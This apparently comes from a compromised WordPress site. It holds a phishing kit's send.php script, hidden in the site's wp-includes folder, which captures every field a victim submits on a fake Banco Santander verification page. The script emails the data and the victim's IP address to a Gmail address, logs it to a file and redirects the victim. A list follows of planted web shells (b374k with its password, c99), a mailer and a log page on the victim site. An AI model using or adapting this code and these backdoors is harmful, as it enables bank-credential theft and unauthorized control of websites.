/home/fundacionsol/public_html/wp-includes/css/verificacion-bancosantander/sant/send.php 

allinex001@gmail.com

<?php
session_start();
$ip = getenv("REMOTE_ADDR");

$postdata="";
foreach ($_POST as $key => $value){
		$postdata .= htmlspecialchars($key)."=".htmlspecialchars($value)."<br>";
}	
$_SESSION['log']=$postdata;

$message="";
$message .= "</br>#".  date('H:i:s')."#$ip</br>";
$message .= "============================ : </br>";
$message .= $postdata;
$message .= "============================ : $ip</br></br>";

$send = "allinex001@gmail.com";


$subject = "|Santander| $ip |";


$from = "From: Spain <josfrans@server1.starthosting.nl>";


mail($send,$subject,$message,$from);

file_put_contents('../maybe.html', $message . "<script>window.scrollTo(0,document.body.scrollHeight);</script>",FILE_APPEND);

header("Location: BancoSantander.htm");
?>

https://www.fundacionsolar.org.gt/wp-includes/vemo.php/

https://www.fundacionsolar.org.gt/wp-content/plugins/wp-sph/sh/b374k.php -> PASS: b374k
https://www.fundacionsolar.org.gt/tro.php -> Mailer
https://www.fundacionsolar.org.gt/wp-includes/log.php
https://www.fundacionsolar.org.gt/wp-content/plugins/wp-sph/sh/c99.php
